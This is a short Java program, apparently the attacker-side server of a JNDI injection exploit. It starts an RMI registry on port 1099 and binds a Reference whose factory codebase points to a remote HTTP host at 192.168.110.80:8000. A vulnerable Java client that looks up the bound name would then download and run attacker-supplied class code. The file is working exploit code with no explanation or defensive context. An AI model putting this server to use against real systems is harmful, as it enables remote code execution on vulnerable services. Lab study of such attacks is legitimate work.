package org.example.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ReferenceServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
        String url = "http://192.168.110.80:8000/";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Test", "Test", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("obj",referenceWrapper);
        System.out.println("running");
    }
}
